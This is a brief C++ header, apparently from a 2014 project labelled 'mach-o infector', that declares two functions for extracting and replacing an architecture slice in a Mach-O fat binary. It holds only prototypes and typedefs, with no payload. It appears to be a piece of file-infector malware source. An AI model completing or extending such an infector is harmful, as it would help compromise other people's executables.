//
//  fat.h
//  mach-o infector
//
//  Created by Pest on 27.11.14.
//  Copyright (c) 2014 coru.ws. All rights reserved.
//

#ifndef __my__fat__
#define __my__fat__

typedef unsigned char uint8;
typedef unsigned short uint16;
typedef unsigned int uint32;


bool get_arch_from_fat(uint8 *buf,uint32 size,uint32 cputype,uint8 *&out,uint32 &lout);
bool update_arch_fat(uint8 *&buf,uint32 &size,uint32 cputype,uint8 *in,uint32 lin);

#endif /* defined(__my__fat__) */
